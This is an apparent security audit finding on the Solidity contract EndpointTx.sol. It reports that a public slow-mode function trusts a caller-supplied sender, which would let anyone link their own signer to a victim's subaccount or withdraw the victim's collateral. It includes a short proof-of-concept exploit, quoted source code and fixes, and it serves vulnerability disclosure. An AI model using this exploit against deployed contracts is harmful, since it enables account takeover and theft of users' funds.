### Title
Publicly Callable `processSlowModeTransactionImpl` Accepts Attacker-Controlled `sender`, Enabling Unauthorized Subaccount Mutation — (File: `core/contracts/EndpointTx.sol`)

---

### Summary

`processSlowModeTransactionImpl` in `EndpointTx.sol` is declared `public` and accepts `sender` as a caller-supplied `address` parameter. Its ownership check (`validateSender`) only verifies that the first 20 bytes of `txn.sender` match the provided `sender` argument — not `msg.sender`. Because the function is publicly reachable and both `sender` and `txn.sender` are fully attacker-controlled, any caller can impersonate any subaccount owner and execute privileged slow-mode operations (e.g., `LinkSigner`, `WithdrawCollateral`) against a victim's subaccount without their consent.

---

### Finding Description

The intended slow-mode entry point is `submitSlowModeTransactionImpl`, which correctly binds `sender` to `msg.sender`: [1](#0-0) 

However, `processSlowModeTransactionImpl` — the function that actually dispatches and executes slow-mode transactions — is separately declared `public` with `sender` as a free parameter: [2](#0-1) 

For every privileged operation it handles, ownership is checked via `validateSender(txn.sender, sender)`: [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) 

`validateSender` checks only that `address(uint160(bytes20(txn.sender))) == sender`. Since an attacker calling `processSlowModeTransactionImpl` directly controls both `sender` (the `address` argument) and `txn.sender` (the bytes32 subaccount embedded in the transaction payload), they can trivially satisfy this check for any victim subaccount by setting `sender = victimAddress` and crafting `txn.sender = bytes32(bytes20(victimAddress)) | anySuffix`.

The `LinkSigner` slow-mode path is the most critical: [7](#0-6) 

An attacker passes `sender = victimAddress`, crafts a `LinkSigner` payload with `txn.sender` encoding the victim's subaccount and `txn.signer` set to the attacker's address. `validateSender` passes, `requireSubaccount` passes (the subaccount exists), and `linkedSigners[victimSubaccount]` is overwritten with the attacker's address.

The `WithdrawCollateral` path is equally exploitable: [8](#0-7) 

---

### Impact Explanation

- **`LinkSigner` exploit**: Attacker overwrites `linkedSigners[victimSubaccount]` with their own address. The linked signer is accepted as a valid signer for all subsequent sequencer-path transactions (`validateSignedTx` with `allowLinkedSigner = true`). The attacker can then submit orders, transfer quote, or burn NLP on behalf of the victim.
- **`WithdrawCollateral` exploit**: Attacker drains the victim's collateral balance to an arbitrary address by crafting a `WithdrawCollateral` transaction with `txn.sender` = victim's subaccount.

Both result in direct, irreversible asset loss or full account takeover for the victim. [9](#0-8) 

---

### Likelihood Explanation

- The function is `public` with no access modifier — no privilege, no sequencer key, no governance is required.
- The attacker needs only the victim's wallet address (derivable from any on-chain subaccount event) and the ability to call a contract function.
- The `validateSender` check is trivially satisfied because both arguments are attacker-controlled.
- Likelihood: **High**.

---

### Recommendation

1. Remove the `public` visibility from `processSlowModeTransactionImpl` and replace it with `internal`. All external callers should go through `submitSlowModeTransactionImpl`, which correctly binds `sender = msg.sender`.
2. If `processSlowModeTransactionImpl` must remain callable by the sequencer with an explicit `sender`, add an `onlySequencer` (or equivalent) access modifier so that only the trusted sequencer can supply an arbitrary `sender`.
3. As a defense-in-depth measure, replace `validateSender(txn.sender, sender)` with a check against `msg.sender` directly wherever the function is called from a user-facing context.

---

### Proof of Concept

```solidity
// Attacker EOA: 0xATTACKER
// Victim address: 0xVICTIM
// Victim subaccount: bytes32(bytes20(0xVICTIM)) | bytes12(0) = victimSubaccount

// Step 1: Craft a LinkSigner slow-mode transaction payload
IEndpoint.LinkSigner memory lsTx = IEndpoint.LinkSigner({
    sender: victimSubaccount,          // first 20 bytes = 0xVICTIM
    signer: bytes32(bytes20(0xATTACKER)),
    nonce: 0
});
bytes memory transaction = abi.encodePacked(
    uint8(IEndpoint.TransactionType.LinkSigner),
    abi.encode(lsTx)
);

// Step 2: Call processSlowModeTransactionImpl directly, passing victimAddress as sender
IEndpointTx(endpointProxy).processSlowModeTransactionImpl(
    address(0xVICTIM),   // sender — attacker-controlled, set to victim's address
    transaction
);

// Result: linkedSigners[victimSubaccount] = 0xATTACKER
// Attacker can now sign any sequencer-path transaction on behalf of the victim.
``` [10](#0-9)

### Citations

**File:** core/contracts/EndpointTx.sol (L202-239)
```text
    function processSlowModeTransactionImpl(
        address sender,
        bytes calldata transaction
    ) public {
        IEndpoint.TransactionType txType = IEndpoint.TransactionType(
            uint8(transaction[0])
        );
        if (txType == IEndpoint.TransactionType.DepositCollateral) {
            IEndpoint.DepositCollateral memory txn = abi.decode(
                transaction[1:],
                (IEndpoint.DepositCollateral)
            );
            validateSender(txn.sender, sender);
            _recordSubaccount(txn.sender);
            clearinghouse.depositCollateral(txn);
        } else if (txType == IEndpoint.TransactionType.WithdrawCollateral) {
            IEndpoint.WithdrawCollateral memory txn = abi.decode(
                transaction[1:],
                (IEndpoint.WithdrawCollateral)
            );
            validateSender(txn.sender, sender);
            clearinghouse.withdrawCollateral(
                txn.sender,
                txn.productId,
                txn.amount,
                address(0),
                nSubmissions
            );
        } else if (txType == IEndpoint.TransactionType.DepositInsurance) {
            clearinghouse.depositInsurance(transaction);
        } else if (txType == IEndpoint.TransactionType.LinkSigner) {
            IEndpoint.LinkSigner memory txn = abi.decode(
                transaction[1:],
                (IEndpoint.LinkSigner)
            );
            validateSender(txn.sender, sender);
            requireSubaccount(txn.sender);
            linkedSigners[txn.sender] = address(uint160(bytes20(txn.signer)));
```

**File:** core/contracts/EndpointTx.sol (L321-321)
```text
            validateSender(txn.sender, sender);
```

**File:** core/contracts/EndpointTx.sol (L332-341)
```text
    function submitSlowModeTransactionImpl(bytes calldata transaction) public {
        IEndpoint.TransactionType txType = IEndpoint.TransactionType(
            uint8(transaction[0])
        );

        // special case for DepositCollateral because upon
        // slow mode submission we must take custody of the
        // actual funds

        address sender = msg.sender;
```

**File:** core/contracts/EndpointTx.sol (L576-590)
```text
        } else if (txType == IEndpoint.TransactionType.LinkSigner) {
            IEndpoint.SignedLinkSigner memory signedTx = abi.decode(
                transaction[1:],
                (IEndpoint.SignedLinkSigner)
            );
            validateSignedTx(
                signedTx.tx.sender,
                signedTx.tx.nonce,
                transaction,
                signedTx.signature,
                true
            );
            linkedSigners[signedTx.tx.sender] = address(
                uint160(bytes20(signedTx.tx.signer))
            );
```
